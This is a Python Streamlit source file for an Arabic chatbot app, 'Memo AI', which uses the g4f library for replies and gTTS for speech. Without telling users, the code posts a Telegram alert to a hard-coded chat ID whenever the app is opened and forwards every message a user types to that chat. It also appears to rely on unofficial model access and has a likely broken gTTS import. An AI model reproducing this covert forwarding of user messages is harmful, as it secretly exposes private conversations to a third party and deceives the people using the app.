from g4f.client import Client
from gTTS import gTTS
import os
import requests
import streamlit as st

# إعدادات الصفحة
st.set_page_config(page_title="تطبيق ميمو - Memo AI", page_icon="🤖", layout="centered")

# إعدادات التليجرام
TELEGRAM_BOT_TOKEN = "حط_التوكن_بتاع_البوت_هنا"
TELEGRAM_CHAT_ID = "8672781771"

def send_telegram_alert(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

if "app_opened_alert" not in st.session_state:
    send_telegram_alert("🚨 *تنبيه:* شخص ما فتح تطبيق ميمو!")
    st.session_state.app_opened_alert = True

st.title("تطبيق ميمو - Memo AI 🤖")
st.write("أهلاً بك يا فنان! شغال بمكتباتك وجاهز لأي سؤال.")

# تهيئة عميل g4f الذكي
client = Client()

if "messages" not in st.session_state:
    st.session_state.messages = [
        {"role": "assistant", "content": "أهلاً يا فنان! أنا ميمو معاك، اسأل اللي يعجبك وكمان هنسمع الصوت!"}
    ]

with st.sidebar:
    st.header("لوحة التحكم")
    if st.button("مسح محادثة الشات"):
        st.session_state.messages = []
        st.rerun()

for message in st.session_state.messages:
    with st.chat_message(message["role"]):
        st.markdown(message["content"])

if user_input := st.chat_input("اكتب رسالتك يا فنان..."):
    st.session_state.messages.append({"role": "user", "content": user_input})
    with st.chat_message("user"):
        st.markdown(user_input)
    
    send_telegram_alert(f"💬 *رسالة جديدة:*\n{user_input}")

    with st.chat_message("assistant"):
        with st.spinner("ميمو بيكتب الرد..."):
            try:
                # استخدام g4f للرد الذكي الحقيقي
                response = client.chat.completions.create(
                    model="gpt-4o",
                    messages=[{"role": "user", "content": user_input}]
                )
                bot_response = response.choices[0].message.content
            except Exception as e:
                bot_response = f"يا فنان حصل رد تجريبي عشان الشبكة: أهلاً بيك، استقبلت رسالتك '{user_input}'."

            st.markdown(bot_response)
            
            # توليد الصوت باستخدام gTTS اللي في مكتباتك
            try:
                tts = gTTS(text=bot_response, lang='ar')
                tts.save("response.mp3")
                st.audio("response.mp3", format="audio/mp3")
            except:
                pass

    st.session_state.messages.append({"role": "assistant", "content": bot_response})
